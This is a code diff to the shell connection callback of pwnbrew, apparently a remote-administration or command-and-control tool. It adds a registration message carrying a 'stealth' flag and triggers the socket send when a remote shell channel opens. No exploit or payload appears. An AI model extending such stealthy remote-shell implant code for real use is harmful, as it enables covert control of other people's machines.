@@ -37,12 +37,17 @@ The copyright on this package is held by Securifera, Inc
 */
 package pwnbrew.network.shell;
 
+import pwnbrew.ClientConfig;
 import pwnbrew.manager.DataManager;
 import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.ConnectionCallback;
+import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.control.messages.CreateShellAck;
+import pwnbrew.network.control.messages.NoOp;
+import pwnbrew.selector.SocketChannelHandler;
+import pwnbrew.utilities.DebugPrinter;
 
 /**
  *
@@ -78,6 +83,15 @@ public class ShellConnectionCallback extends ConnectionCallback{
         ClientPortRouter aPR = (ClientPortRouter) theManager.getPortRouter( socketPort );
         if(theChannelId != 0 ){
             
+            ClientConfig theConf = ClientConfig.getConfig();
+            byte stlth_val = 0;
+            if( theConf.useStealth() )
+                stlth_val = 1;   
+
+            //Queue register message
+            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, theChannelId);
+            DataManager.send(theManager, aMsg);
+            
             //Send ack back to set channel id
             CreateShellAck retMsg = new CreateShellAck( theChannelId );
             retMsg.setDestHostId( theShell.getHostId() );
@@ -90,6 +104,11 @@ public class ShellConnectionCallback extends ConnectionCallback{
             //Register the shell
             OutgoingConnectionManager aOCM = aPR.getConnectionManager();
             aOCM.setShell( theChannelId, theShell );
+            
+            //Send & Receive message
+            SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(theChannelId);
+            if( aSCH != null )
+                aSCH.signalSend();            
 
         }
     }
